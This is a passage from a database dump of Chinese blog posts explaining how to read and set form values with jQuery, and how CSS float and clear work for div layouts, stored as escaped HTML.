/>\r\n//多选框checkbox：&nbsp;&nbsp;<br />\r\n$(&quot;#chk_id&quot;).attr(&quot;checked&quot;,&#39;&#39;);//未选中的值&nbsp;&nbsp;<br />\r\n$(&quot;#chk_id&quot;).attr(&quot;checked&quot;,true);//选中的值&nbsp;&nbsp;<br />\r\nif($(&quot;#chk_id&quot;).attr(&#39;checked&#39;)==undefined)&nbsp;//判断是否已经选中&nbsp;&nbsp;<br />\r\n//单选组radio：&nbsp;&nbsp;<br />\r\n$(&quot;input[@type=radio]&quot;).attr(&quot;checked&quot;,&#39;10&#39;);//设置value=10的单选按钮为当前选中项&nbsp;&nbsp;<br />\r\n//下拉框select：&nbsp;&nbsp;<br />\r\n$(&quot;#select_id&quot;).attr(&quot;value&quot;,&#39;test&#39;);//设置value=test的项目为当前选中项&nbsp;&nbsp;<br />\r\n$(&quot;&lt;option&nbsp;value=&#39;test&#39;&gt;test&lt;/option&gt;&lt;option&nbsp;value=&#39;test2&#39;&gt;test2&lt;/option&gt;&quot;).appendTo(&quot;#select_id&quot;)//添加下拉框的option&nbsp;&nbsp;<br />\r\n$(&quot;#select_id&quot;).empty()；//清空下拉框&nbsp;</p>\r\n\r\n<p style=\"text-align:justify\">补充&nbsp;<br />\r\n获取一组radio被选中项的值&nbsp;<br />\r\nvar&nbsp;item&nbsp;=&nbsp;$(&#39;input[@name=items][@checked]&#39;).val();&nbsp;<br />\r\n获取select被选中项的文本&nbsp;<br />\r\nvar&nbsp;item&nbsp;=&nbsp;$(&quot;select[@name=items]&nbsp;option[@selected]&quot;).text();&nbsp;<br />\r\nselect下拉框的第二个元素为当前选中值&nbsp;<br />\r\n$(&#39;#select_id&#39;)[0].selectedIndex&nbsp;=&nbsp;1;&nbsp;<br />\r\nradio单选组的第二个元素为当前选中值&nbsp;<br />\r\n$(&#39;input[@name=items]&#39;).get(1).checked&nbsp;=&nbsp;true;&nbsp;</p>\r\n\r\n<p style=\"text-align:justify\">获取值：&nbsp;</p>\r\n\r\n<p style=\"text-align:justify\">文本框，文本区域：$(&quot;#txt&quot;).attr(&quot;value&quot;)；&nbsp;<br />\r\n多选框checkbox：$(&quot;#checkbox_id&quot;).attr(&quot;value&quot;)；&nbsp;<br />\r\n单选组radio：&nbsp;$(&quot;input[@type=radio][@checked]&quot;).val();&nbsp;<br />\r\n下拉框select：&nbsp;$(&#39;#sel&#39;).val();&nbsp;</p>\r\n\r\n<p style=\"text-align:justify\">控制表单元素：&nbsp;<br />\r\n文本框，文本区域：$(&quot;#txt&quot;).attr(&quot;value&quot;,&#39;&#39;);//清空内容&nbsp;<br />\r\n$(&quot;#txt&quot;).attr(&quot;value&quot;,&#39;11&#39;);//填充内容&nbsp;</p>\r\n\r\n<p style=\"text-align:justify\">多选框checkbox：&nbsp;$(&quot;#chk1&quot;).attr(&quot;checked&quot;,&#39;&#39;);//不打勾&nbsp;<br />\r\n$(&quot;#chk2&quot;).attr(&quot;checked&quot;,true);//打勾&nbsp;<br />\r\nif($(&quot;#chk1&quot;).attr(&#39;checked&#39;)==undefined)&nbsp;//判断是否已经打勾&nbsp;</p>\r\n\r\n<p style=\"text-align:justify\">单选组radio：&nbsp;$(&quot;input[@type=radio]&quot;).attr(&quot;checked&quot;,&#39;2&#39;);//设置value=2的项目为当前选中项&nbsp;<br />\r\n下拉框select：&nbsp;$(&quot;#sel&quot;).attr(&quot;value&quot;,&#39;-sel3&#39;);//设置value=-sel3的项目为当前选中项&nbsp;<br />\r\n$(&quot;&lt;option&nbsp;value=&#39;1&#39;&gt;1111&lt;/option&gt;&lt;option&nbsp;value=&#39;2&#39;&gt;2222&lt;/option&gt;&quot;).appendTo(&quot;#sel&quot;)//添加下拉框的option&nbsp;<br />\r\n$(&quot;#sel&quot;).empty()；//清空下拉框</p>\r\n\r\n<p style=\"text-align:justify\"><span style=\"color:rgb(0, 0, 0); font-family:verdana; font-size:13px\"><strong>在VS2010测试 获取文本框的值</strong></span></p>\r\n\r\n<pre>\r\n<code class=\"language-html\">  &lt;script type=\"text/javascript\"&gt;\r\n        function GetRoleInfo() {\r\n\r\n            var val1 = $(\"#TextBox1\").attr(\"value\");\r\n            alert(val1);\r\n            var val2 = $(\"#Text1\").attr(\"value\");\r\n            alert(val2);\r\n\r\n            var va3 = document.getElementsByName(\"Text1\");\r\n            for (var i = 0; i &lt; va3.length; i++) {\r\n                var att = va3[i].getAttribute(\"value\");\r\n                alert(att);\r\n                        }\r\n\r\n        }\r\n\r\n&lt;/script&gt;\r\n\r\n&lt;body&gt;\r\n    &lt;form id=\"form1\" runat=\"server\"&gt;\r\n    &lt;div&gt;\r\n         &lt;asp:TextBox ID=\"TextBox1\" runat=\"server\" Text=\"fdf\"   onblur=\"javascript:GetRoleInfo()\" &gt;&lt;/asp:TextBox&gt;\r\n         &lt;input id=\"Text1\"  name=\"Text1\" type=\"text\"  value=\"test\" onblur=\"javascript:GetRoleInfo()\"/&gt;\r\n\r\n    &lt;/div&gt;\r\n    &lt;/form&gt;\r\n&lt;/body&gt;</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'jquery获取form表单text,areatext,radio,checkbox,select值 以及 JavaScrpt获取文本框值',75,NULL,0),(63,0,'20150713080237',2,'<p>首先我们了解到，CSS网页布局的原理，就是按照HTML代码中对象声明的顺序，以流布局的方式来显示它，而流布局就不得不说到float浮动技术。.在HTML中的所有对象，默认分为两种：块元素(block element)、内联元素(inline element)，虽然也存在着可变元素，但只是随上下文关系确定该元素是块元素或者内联元素。</p>\r\n\r\n<p>其实CSS的float属性，作用就是改变块元素(block element)对象的默认显示方式。block对象设置了float属性之后，它将不再独自占据一行。可以浮动到左侧或右侧。</p>\r\n\r\n<p><strong>浮动的框可以向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。</strong><strong>由于浮动框不在文档的普通流中，所以文档的普通流中的块框表现得就像浮动框不存在一样。</strong></p>\r\n\r\n<p>请看下图，当把框 1 向右浮动时，它脱离文档流并且向右移动，直到它的右边缘碰到包含框的右边缘：<img alt=\"CSS之float详解 - 海上明月 - 心情驿站\" src=\"http://www.w3school.com.cn/i/ct_css_positioning_floating_right_example.gif\" style=\"border:0px; height:auto; max-width:100%\" /></p>\r\n\r\n<p>再请看下图，当框 1 向左浮动时，它脱离文档流并且向左移动，直到它的左边缘碰到包含框的左边缘。因为它不再处于文档流中，所以它不占据空间，实际上覆盖住了框 2，使框 2 从视图中消失。</p>\r\n\r\n<p>如果把所有三个框都向左移动，那么框 1 向左浮动直到碰到包含框，另外两个框向左浮动直到碰到前一个浮动框。<img alt=\"CSS之float详解 - 海上明月 - 心情驿站\" src=\"http://www.w3school.com.cn/i/ct_css_positioning_floating_left_example.gif\" style=\"border:0px; height:auto; max-width:100%\" /></p>\r\n\r\n<p>如下图所示，如果包含框太窄，无法容纳水平排列的三个浮动元素，那么其它浮动块向下移动，直到有足够的空间。如果浮动元素的高度不同，那么当它们向下移动时可能被其它浮动元素&ldquo;卡住&rdquo;：<img alt=\"CSS之float详解 - 海上明月 - 心情驿站\" src=\"http://www.w3school.com.cn/i/ct_css_positioning_floating_left_example_2.gif\" style=\"border:0px; height:auto; max-width:100%\" />&nbsp;&nbsp;</p>\r\n\r\n<p>------------------------------------------------------------------------------------------------------------------------------</p>\r\n\r\n<p>行框和清理</p>\r\n\r\n<p>浮动框旁边的行框被缩短，从而给浮动框留出空间，行框围绕浮动框。</p>\r\n\r\n<p>因此，创建浮动框可以使文本围绕图像：<img alt=\"CSS之float详解 - 海上明月 - 心情驿站\" src=\"http://www.w3school.com.cn/i/ct_css_positioning_floating_linebox.gif\" style=\"border:0px; height:auto; max-width:100%\" /></p>\r\n\r\n<p>要想阻止行框围绕浮动框，需要对该框应用&nbsp;clear 属性。clear 属性的值可以是 left、right、both 或 none，它表示框的哪些边不应该挨着浮动框。</p>\r\n\r\n<p>为了实现这种效果，在被清理的元素的上外边距上添加足够的空间，使元素的顶边缘垂直下降到浮动框下面：<img alt=\"CSS之float详解 - 海上明月 - 心情驿站\" src=\"http://www.w3school.com.cn/i/ct_css_positioning_floating_clear.gif\" style=\"border:0px; height:auto; max-width:100%\" /></p>\r\n\r\n<p>这是一个有用的工具，它让周围的元素为浮动元素留出空间。</p>\r\n\r\n<p>让我们更详细地看看浮动和清理。假设希望让一个图片浮动到文本块的左边，并且希望这幅图片和文本包含在另一个具有背景颜色和边框的元素中。您可能编写下面的代码：</p>\r\n\r\n<p>.news { background-color: gray; border: solid 1px black; }.news img { float: left; }.news p { float: right; }&lt;div class=&quot;news&quot;&gt;&lt;img src=&quot;news-pic.jpg&quot; /&gt;&lt;p&gt;some text&lt;/p&gt;&lt;/div&gt;</p>\r\n\r\n<p>这种情况下，出现了一个问题。因为浮动元素脱离了文档流，所以包围图片和文本的 div 不占据空间。</p>\r\n\r\n<p>如何让包围元素在视觉上包围浮动元素呢？需要在这个元素中的某个地方应用 clear：<img alt=\"CSS之float详解 - 海上明月 - 心情驿站\" src=\"http://www.w3school.com.cn/i/ct_css_positioning_floating_clear_div.gif\" style=\"border:0px; height:auto; max-width:100%\" /></p>\r\n\r\n<p>不幸的是出现了一个新的问题，由于没有现有的元素可以应用清理，所以我们只能添加一个空元素并且清理它。</p>\r\n\r\n<p>.news { background-color: gray; border: solid 1px black; }.news img { float: right; }.news p { float: right; }</p>\r\n\r\n<p>.clear { clear: both; }</p>\r\n\r\n<p>&lt;div class=&quot;news&quot;&gt;&lt;img src=&quot;news-pic.jpg&quot; /&gt;&lt;p&gt;some text&lt;/p&gt;</p>\r\n\r\n<p>&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;</p>\r\n\r\n<p>&lt;/div&gt;</p>\r\n\r\n<p>这样可以实现我们希望的效果，但是需要添加多余的代码。常常有元素可以应用 clear，但是有时候不得不为了进行布局而添加无意义的标记。</p>\r\n\r\n<p>不过我们还有另一种办法，那就是对容器 div 进行浮动：</p>\r\n\r\n<p>.news { background-color: gray; border: solid 1px black;</p>\r\n\r\n<p>float: left;</p>\r\n\r\n<p>}.news img { float: right; }.news p { float: right; }&lt;div class=&quot;news&quot;&gt;&lt;img src=&quot;news-pic.jpg&quot; /&gt;&lt;p&gt;some text&lt;/p&gt;&lt;/div&gt;</p>\r\n\r\n<p>这样会得到我们希望的效果。不幸的是，下一个元素会受到这个浮动元素的影响。为了解决这个问题，有些人选择对布局中的所有东西进行浮动，然后使用适当的有意义的元素（常常是站点的页脚）对这些浮动进行清理。这有助于减少或消除不必要的标记。</p>\r\n\r\n<p>事实上，W3School 站点上的所有页面都采用了这种技术，如果您打开我们使用 CSS 文件，您会看到我们对页脚的 div 进行了清理，而页脚上面的三个 div 都向左浮动。</p>\r\n',0,0,'CSS之float详解  ',71,NULL,0),(64,0,'20150713080401',2,'<p>&nbsp;很早以前就接触过CSS，但对于浮动始终非常迷惑，可能是自身理解能力差，也可能是没能遇到一篇通俗的教程。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 前些天小菜终于搞懂了浮动的基本原理，迫不及待的分享给大家。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p><strong>写在前面的话：</strong></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 由于CSS内容比较多，小菜没有精力从头到尾讲一遍，只能有针对性的讲解。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果读者理解CSS盒子模型，但对于浮动不理解，那么这篇文章可以帮助你。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 小菜水平有限，本文仅仅是入门教程，不当之处请谅解！</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 本文以div元素布局为例。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>教程开始：</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 首先要知道，div是块级元素，在页面中独占一行，自上而下排列，也就是传说中的<strong>流</strong>。如下图：</p>\r\n\r\n<p>&nbsp;<img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27004951-2cdc11e4340c484ab8a7eb8f515a683e.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px\" /></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 可以看出，即使div1的宽度很小，页面中一行可以容下div1和div2，div2也不会排在div1后边，因为div元素是独占一行的。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注意，以上这些理论，是指标准流中的div。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 小菜认为，无论多么复杂的布局，其基本出发点均是：&ldquo;<strong>如何在一行显示多个</strong><strong>div</strong><strong>元素</strong>&rdquo;。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显然标准流已经无法满足需求，这就要用到浮动。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 浮动可以理解为让某个div</strong><strong>元素脱离标准流，漂浮在标准流之上，和标准流不是一个层次。</strong></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 例如，假设上图中的div2浮动，那么它将脱离标准流，但div1、div3、div4仍然在标准流当中，所以div3会自动向上移动，占据div2的位置，重新组成一个流。如图：</p>\r\n\r\n<p>&nbsp;<img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005043-61e7e3050eb3466d99f25b10f449daa3.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px\" /></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 从图中可以看出，由于对div2设置浮动，因此它不再属于标准流，div3自动上移<strong>顶替</strong>div2的位置，div1、div3、div4依次排列，成为一个新的流。又因为浮动是漂浮在标准流之上的，因此div2挡住了一部分div3，div3看起来变&ldquo;矮&rdquo;了。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这里div2用的是左浮动(float:left;)，可以理解为漂浮起来后靠左排列，右浮动(float:right;)当然就是靠右排列。这里的靠左、靠右是说页面的左、右边缘。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果我们把div2采用右浮动，会是如下效果：</p>\r\n\r\n<p>&nbsp;<img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005121-3bfe4640443c4cd19c850857cc1ce39b.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px; width:922px\" /></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 此时div2靠页面右边缘排列，不再遮挡div3，读者可以清晰的看到上面所讲的div1、div3、div4组成的流。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 目前为止我们只浮动了一个div元素，多个呢？</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 下面我们把div2和div3都加上左浮动，效果如图：</p>\r\n\r\n<p>&nbsp;<img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005158-1b23072329b04449a4438af06cbb8387.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px\" /></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 同理，由于div2、div3浮动，它们不再属于标准流，因此div4会自动上移，与div1组成一个&ldquo;新&rdquo;标准流，而浮动是漂浮在标准流之上，因此div2又挡住了div4。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 咳咳，到重点了，当同时对div2、div3设置浮动之后，div3会跟随在div2之后，不知道读者有没有发现，一直到现在，div2在每个例子中都是浮动的，但并没有跟随到div1之后。因此，我们可以得出一个重要结论：</p>\r\n\r\n<p><span style=\"color:rgb(255, 0, 0)\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>假如某个div</strong><strong>元素A</strong><strong>是浮动的，如果A</strong><strong>元素上一个元素也是浮动的，那么A</strong><strong>元素会跟随在上一个元素的</strong><span style=\"color:rgb(0, 0, 255)\"><strong>后</strong></span><strong><span style=\"color:rgb(0, 0, 255)\">边</span>(</strong><strong>如果一行放不下这两个元素，那么A</strong><strong>元素会被挤到下一行)</strong><strong>；如果A</strong><strong>元素上一个元素是标准流中的元素，那么A</strong><strong>的相对垂直位置不会改变，也就是说A</strong><strong>的顶部总是和上一个元素的底部对齐。</strong></span></p>\r\n\r\n<p><span style=\"color:rgb(255, 0, 0)\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>div</strong><strong>的顺序是HTML</strong><strong>代码中div</strong><strong>的顺序决定的。</strong></span></p>\r\n\r\n<p><span style=\"color:rgb(255, 0, 0)\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>靠近页面边缘的一端是</strong><span style=\"color:rgb(0, 0, 255)\"><strong>前</strong></span><strong>，远离页面边缘的一端是</strong><span style=\"color:rgb(0, 0, 255)\"><strong>后</strong></span><strong>。</strong></span></p>\r\n\r\n<p>&nbsp;<img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005253-004f304d2c6e424d81e7658e26d3f8a3.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px\" /></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 为了帮助读者理解，再举几个例子。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 假如我们把div2、div3、div4都设置成<strong>左</strong>浮动，效果如下：</p>\r\n\r\n<p>&nbsp;<img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005331-95ad1122cc5641a3a3701e6c7fb775e0.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px\" /></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 根据上边的结论，跟着小菜理解一遍：先从div4开始分析，它发现上边的元素div3是浮动的，所以div4会跟随在div3之后；div3发现上边的元素div2也是浮动的，所以div3会跟随在div2之后；而div2发现上边的元素div1是标准流中的元素，因此div2的相对垂直位置不变，顶部仍然和div1元素的底部对齐。由于是左浮动，左边靠近页面边缘，所以左边是前，因此div2在最左边。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 假如把div2、div3、div4都设置成<strong>右</strong>浮动，效果如下：</p>\r\n\r\n<p>&nbsp;<img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005405-331c3a369d5c4bfb8692c40ac3e59bf9.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px; width:922px\" /></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 道理和左浮动基本一样，只不过需要注意一下前后对应关系。由于是右浮动，因此右边靠近页面边缘，所以右边是前，因此div2在最右边。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 假如我们把div2、div4左浮动，效果图如下：</p>\r\n\r\n<p>&nbsp;<img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005436-fc787817a4d84c1590684b0b53d92267.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px\" /></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 依然是根据结论，div2、div4浮动，脱离了标准流，因此div3将会自动上移，与div1组成标准流。div2发现上一个元素div1是标准流中的元素，因此div2相对垂直位置不变，与div1底部对齐。div4发现上一个元素div3是标准流中的元素，因此div4的顶部和div3的底部对齐，并且总是成立的，因为从图中可以看出，div3上移后，div4也跟着上移，<strong>div4</strong><strong>总是保证自己的顶部和上一个元素div3(</strong><strong>标准流中的元素)</strong><strong>的底部对齐</strong>。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 至此，恭喜读者已经掌握了添加浮动，但还有清除浮动，有上边的基础清除浮动非常容易理解。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 经过上边的学习，可以看出：元素浮动之前，也就是在标准流中，是竖向排列的，而浮动之后可以理解为横向排列。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>清除浮动可以理解为打破横向排列。</strong></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 清除浮动的关键字是clear，官方定义如下：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 语法：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clear : none | left | right | both</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 取值：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; none&nbsp; :&nbsp; 默认值。允许两边都可以有浮动对象</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; left&nbsp;&nbsp; :&nbsp; 不允许左边有浮动对象</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; right&nbsp; :&nbsp; 不允许右边有浮动对象</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; both&nbsp; :&nbsp; 不允许有浮动对象</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 定义非常容易理解，但是读者实际使用时可能会发现不是这么回事。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 定义没有错，只不过它描述的太模糊，让我们不知所措。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 根据上边的基础，假如页面中只有两个元素div1、div2，它们都是左浮动，场景如下：</p>\r\n\r\n<p><img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005535-a73c3a18ef8b432496fbaa26b532d9da.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px\" /></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 此时div1、div2都浮动，根据规则，div2会跟随在div1后边，但我们仍然希望div2能排列在div1下边，就像div1没有浮动，div2左浮动那样。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 这时候就要用到清除浮动（clear），如果单纯根据官方定义，读者可能会尝试这样写：在div1的CSS样式中添加clear:right;，理解为不允许div1的右边有浮动元素，由于div2是浮动元素，因此会自动下移一行来满足规则。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 其实这种理解是不正确的，这样做没有任何效果。看小菜定论：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color:rgb(255, 0, 0)\"><strong>对于CSS</strong><strong>的清除浮动(clear)</strong><strong>，一定要牢记：这个规则只能影响使用清除的元素本身，不能影响其他元素。</strong></span></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 怎么理解呢？就拿上边的例子来说，我们是想让div2移动，但我们却是在div1元素的CSS样式中使用了清除浮动，试图通过清除div1右边的浮动元素(clear:right;)来强迫div2下移，这是不可行的，因为这个清除浮动是在div1中调用的，它只能影响div1，不能影响div2。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 根据小菜定论，要想让div2下移，就必须在div2的CSS样式中使用浮动。本例中div2的左边有浮动元素div1，因此只要在div2的CSS样式中使用clear:left;来指定div2元素左边不允许出现浮动元素，这样div2就被迫下移一行。</p>\r\n\r\n<p><img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005603-199c35bf7d07478599bf355e3fb8aecf.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px\" /></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么假如页面中只有两个元素div1、div2，它们都是右浮动呢？读者此时应该已经能自己推测场景，如下：</p>\r\n\r\n<p><img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005626-2408e35fd5f74faa92e46df37c04974d.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px\" /></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 此时如果要让div2下移到div1下边，要如何做呢？</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 同样根据小菜定论，我们希望移动的是div2，就必须在div2的CSS样式中调用浮动，因为浮动只能影响调用它的元素。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 可以看出div2的右边有一个浮动元素div1，那么我们可以在div2的CSS样式中使用clear:right;来指定div2的右边不允许出现浮动元素，这样div2就被迫下移一行，排到div1下边。</p>\r\n\r\n<p><img alt=\"\" src=\"http://images.cnitblog.com/blog/471788/201303/27005712-4f0ff1cbbd30482694190d93834bd570.png\" style=\"border:1px solid rgb(204, 204, 204); box-shadow:rgba(0, 0, 0, 0.34902) 0px 0px 10px; display:block; margin:0px auto; padding:0px\" /></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 至此，读者已经掌握了CSS+DIV浮动定位基本原理，足以应付常见的布局。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 其实，万变不离其宗，只要读者用心体会，再复杂的布局都可以通过小菜总结的规律搞定。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>写在后面的话：</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 必须严正声明，CSS这块极其混乱，尤其是浏览器的兼容性问题，小菜水平有限，本文很可能有不当之处，望读者见谅。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 其实真不想写这么长的文章，可为了读者能够理解，总是不由自主的想多举些例子。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 为了减轻读者心理压力，本文没有任何CSS、HTML代码，因为现在很多教程上来就是一大堆CSS代码，看到就烦，别说细读了。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 最后预祝读者阅读愉快，开心掌握知识。</p>\r\n',0,0,'CSS浮动(float,clear)通俗讲解',86,NULL,0),(65,0,'20150713080525',2,'<p><strong>DIV+CSS clear both清除产生浮动</strong></p>\r\n\r\n<p>我们知道有时使用了css float浮动会产生css浮动，这个时候就需要清理清除浮动，我们就用<strong>clear</strong>样式属性即可实现。</p>\r\n\r\n<p>接下来我们来认识与学习<strong>css&nbsp;clear</strong>知识与用法。</p>\r\n\r\n<p><strong>clear清除浮动目录</strong></p>\r\n\r\n<ol>\r\n	<li>clear语法与结构</li>\r\n	<li>div clear常用地方</li>\r\n	<li>css+div案例</li>\r\n	<li>DIVCSS5总结</li>\r\n</ol>\r\n\r\n<p>一、clear语法与结构 &nbsp; - &nbsp;&nbsp;TOP</p>\r\n\r\n<p><strong>1、clear语法：</strong><br />\r\nclear : none | left|right| both&nbsp;<br />\r\n<br />\r\n<strong>2、clear参数值说明：</strong><br />\r\nnone : 　允许两边都可以有浮动对象<br />\r\nboth : 　不允许有浮动对象<br />\r\nleft : 　不允许左边有浮动对象<br />\r\nright : 　不允许右边有浮动对象<br />\r\n<br />\r\n<strong>3、clear解释：</strong><br 